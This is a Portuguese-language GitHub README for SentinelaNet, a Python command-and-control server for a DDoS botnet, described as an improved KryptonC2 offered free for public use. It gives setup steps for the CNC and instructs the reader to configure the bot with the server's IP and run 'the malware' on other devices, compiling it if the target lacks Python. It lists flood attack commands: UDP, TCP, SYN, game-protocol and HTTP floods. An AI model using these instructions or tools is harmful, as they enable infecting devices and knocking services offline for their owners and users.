<div align="center">
    <h1>SentinelaNet</h1>
    <h3>SentinelaNet é uma CNC (Comando e Controle) em Python, projetada para gerenciar um malware que realiza ataques de disparos em massa (DDoS).</h3>

  <p align="center">
      <img src="https://github.com/user-attachments/assets/c7b54c33-26da-43b2-b12e-67a266719f0a">
  </p>
  <p>Esta Botnet é para ser uma versão aprimorada do KryptonC2 e será disponibilizada publicamente e de forma gratuita. Vou hospedá-la e permitir que os usuários a utilizem sem a necessidade de compra.</p>
  
[Quero usar ou testar o SentinelaNet](https://github.com/CirqueiraDev/SentinelaNet/blob/main/payload/BOTNET.md)

</div>

<br>

## **Instalação** 📁
```shell script
git clone https://github.com/CirqueiraDev/SentinelaNet
```
```shell script
cd SentinelaNet
```
```shell script
pip install colorama
```
```shell script
python3 cnc.py <port>
```
**Os logins são salvos em logins.txt no formato "username:password" dentro do arquivo logins.txt** 

<br>

## Configure o malware 💣
```
Mude o IP e a porta do bot.py com o IP (IP publico se não for um teste local) e a porta do seu servidor CNC depois salve o arquivo.
```
```
Depois execute o malware em outro dispositivo que suporte python (caso o alvo não tenha o python você pode compilar o malware)
```

<br>

---

<div align="center">

  ### Admin/root Commands
  Command | Description
  --------|------------
  !admin, !adm | Shows list of admin commands
  !user, !u  | Add/List/Remove users
  !blacklist, !bl | Add/List/Remove blacklisted targets
    
  ### CNC Commands
  Command | Description
  --------|------------
  help, ? | Shows list of commands
  botnet | Shows list of botnet attack methods
  bots | Shows all conected bots
  clear, cls | Clears the console window screen
  exit, logout | Disconnects from the C&C server

  ### Attack Commands
  Command  | Usage | Description
  ---------|-------|-------------
  .UDP     | \<target> \<port> \<time> | Starts UDP Flood
  .UDPB    | \<target> \<port> \<time> | Starts UDP Flood (Bypass)
  .TCP     | \<target> \<port> \<time> | Starts TCP Flood
  .SYN     | \<target> \<port> \<time> | Starts TCP SYN Flood
  .HEX     | \<target> \<port> \<time> | Starts HEXdecimal Flood
  .VSE     | \<target> \<port> \<time> | Send Valve Source Engine Protocol
  .MCPE    | \<target> \<port> \<time> | Minecraft PE Status Ping Protocol
  .FIVEM   | \<target> \<port> \<time> | Send FiveM Status Ping Protocol
  .HTTPGET | \<target> \<port> \<time> | Starts HTTP/1.1 GET Flood
  .HTTPPOST| \<target> \<port> \<time> | Starts HTTP/1.1 POST Flood
  .BROWSER | \<target> \<port> \<time> | Starts HTTP/1.1 BROWSER Simulator Flood
</div>

---

### Last News ✨
- Updated CNC
    - Added blacklist ```01/03/2025```
    - Roblox UDP Flood removed ```06/03/2025``` 

- Updated Payload
    - Updated Browser Flood ```01/03/2025```
    - Added UDP Flood with a simple bypass method ```06/03/2025```
    - Roblox UDP Flood removed ```06/03/2025``` 
---

### Owner 🎮
- **Discord: Cirqueira**
    - [YouTube](https://www.youtube.com/@cirqueiradev)
